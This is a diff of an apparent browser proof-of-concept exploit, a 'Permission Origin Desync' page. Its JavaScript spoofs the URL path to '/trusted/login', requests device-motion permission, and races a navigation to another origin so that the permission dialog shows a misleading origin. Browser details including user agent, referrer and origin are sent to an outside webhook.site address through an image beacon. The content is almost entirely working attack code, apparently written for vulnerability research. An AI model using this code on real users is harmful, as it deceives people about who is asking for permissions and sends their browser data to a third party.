@@ -1,54 +1,17 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Permission Origin Desync PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-
-<style>
-body{margin:0;font-family:-apple-system,BlinkMacSystemFont,system-ui;background:#f5f5f7;text-align:center}
-button{font-size:15px;padding:12px 16px;border-radius:12px;border:none;background:#007aff;color:#fff;margin:8px}
-#panel{display:none;max-width:420px;margin:80px auto;background:#fff;padding:24px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.2)}
-.notice{margin-top:14px;font-size:13px;color:#b00020}
-</style>
-</head>
-
-<body>
-
-<h2 style="margin-top:60px;">Permission Origin Confusion PoC</h2>
-<p>Attacker-controlled origin</p>
-
-<button id="start">Start PoC</button>
-
-<div id="panel">
-  <h3>Request Motion Permission</h3>
-  <p>Observe origin shown in permission dialog</p>
-
-  <button id="motion">🧭 Enable Motion</button>
-
-  <p id="output">Result: -</p>
-
-  <div class="notice">
-    Demo only — UI origin may not match JS origin
-  </div>
-</div>
-
 <script>
 /* ================= CONFIG ================= */
-const WEBHOOK    = 'https://webhook.site/a132a5ec-337f-46d5-958f-f8a8f9376120';
-const NAV_TARGET = 'https://google.com:9090'; // target navigasi (pending)
+const WEBHOOK = 'https://webhook.site/a132a5ec-337f-46d5-958f-f8a8f9376120';
+const NAV_TARGET = 'https://google.com:9090';
 
-/* ================= HELPERS ================= */
 const panel  = document.getElementById('panel');
 const output = document.getElementById('output');
 
-/* ================= PROOF (GET ONLY) ================= */
-function sendProof(status, phase){
+/* ================= ENRICHED GET PROOF ================= */
+function sendProofGET(status) {
   const params = new URLSearchParams({
     poc: 'permission-origin-desync',
     permission: 'motion',
     permission_result: status,
-    phase: phase, // before-permission | after-permission | unload
 
     // attacker context
     attacker_origin: location.origin,
@@ -62,8 +25,9 @@ function sendProof(status, phase){
     visibility: document.visibilityState,
     history_len: history.length,
 
-    // timing
-    perf_now_ms: Math.round(performance.now()),
+    // timing proof
+    now: Math.round(performance.now()),
+    since_load_ms: Math.round(performance.now()),
     ts: Date.now(),
 
     // environment
@@ -71,51 +35,42 @@ function sendProof(status, phase){
     ua: navigator.userAgent
   });
 
-  // Image beacon = GET, paling stabil saat navigasi
+  // GET beacon (paling stabil)
   const img = new Image();
   img.src = WEBHOOK + '?' + params.toString();
 }
 
-/* ================= STEP 1: URL MANIPULATION ================= */
+/* ================= PERMISSION ================= */
+function reqMotion() {
+  if (typeof DeviceMotionEvent?.requestPermission === 'function') {
+    DeviceMotionEvent.requestPermission()
+      .then(res => {
+        output.textContent = 'Motion: ' + res;
+        sendProofGET(res);
+      })
+      .catch(() => {
+        output.textContent = 'Motion denied';
+        sendProofGET('error');
+      });
+  } else {
+    output.textContent = 'Motion API not supported';
+    sendProofGET('unsupported');
+  }
+}
+
+/* ================= ATTACK LOGIC ================= */
 document.getElementById('start').onclick = () => {
   history.pushState({}, '', '/trusted/login');
   panel.style.display = 'block';
 };
 
-/* ================= STEP 2: PERMISSION ================= */
-document.getElementById('motion').onclick = async () => {
-  // bukti sebelum permission (state masih attacker)
-  sendProof('requested', 'before-permission');
-
-  try {
-    if (typeof DeviceMotionEvent?.requestPermission === 'function') {
-      const res = await DeviceMotionEvent.requestPermission();
-      output.textContent = 'Motion: ' + res;
-      sendProof(res, 'after-permission');
-    } else {
-      output.textContent = 'Motion API not supported';
-      sendProof('unsupported', 'after-permission');
-    }
-  } catch {
-    output.textContent = 'Motion denied';
-    sendProof('error', 'after-permission');
-  }
-
-  // ================= STEP 3: NAVIGATION RACE =================
-  requestAnimationFrame(()=>{
-    requestAnimationFrame(()=>{
-      setTimeout(()=>{
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
         location.href = NAV_TARGET;
       }, 80);
     });
   });
-};
-
-/* ================= LAST-CHANCE ================= */
-window.addEventListener('pagehide', () => {
-  sendProof('unknown', 'unload');
 });
 </script>
-
-</body>
-</html>
